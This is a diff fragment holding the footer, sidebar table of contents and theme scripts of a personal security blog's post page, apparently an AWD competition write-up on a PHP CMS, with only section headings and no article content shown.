+              <a target="_blank" class="social-link" href="/atom.xml">
+                <span class="icon">
+                  <i class="fa fa-rss"></i>
+                </span>
+
+                <span class="label">RSS</span>
+              </a>
+            </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/AWD/" rel="tag"><i class="fa fa-tag"></i> AWD</a>
+              <a href="/tags/cms/" rel="tag"><i class="fa fa-tag"></i> cms</a>
+              <a href="/tags/php/" rel="tag"><i class="fa fa-tag"></i> php</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2017/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84MySQL-Out-of-Band%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="prev" title="一道题目引发的MySQL-Out-of-Band学习笔记">
+      <i class="fa fa-chevron-left"></i> 一道题目引发的MySQL-Out-of-Band学习笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/10/14/RCTF-R-CURSIVE/" rel="next" title="RCTF-R-CURSIVE">
+      RCTF-R-CURSIVE <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-后台getshell"><span class="nav-number">2.</span> <span class="nav-text">0x01 后台getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-混淆源码命令执行"><span class="nav-number">3.</span> <span class="nav-text">0x02 混淆源码命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-重置数据库"><span class="nav-number">4.</span> <span class="nav-text">0x03 重置数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-主办方设置的后门利用"><span class="nav-number">5.</span> <span class="nav-text">0x04 主办方设置的后门利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-结语"><span class="nav-number">6.</span> <span class="nav-text">0x05 结语</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Cyc1e"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">Cyc1e</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Cyc1eC" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Cyc1eC" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.jianshu.com/u/9c3ca1ca4784" title="简书 → https:&#x2F;&#x2F;www.jianshu.com&#x2F;u&#x2F;9c3ca1ca4784" rel="noopener" target="_blank"><i class="fa fa-fw fa-heartbeat"></i>简书</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cyc1e</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">14k</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
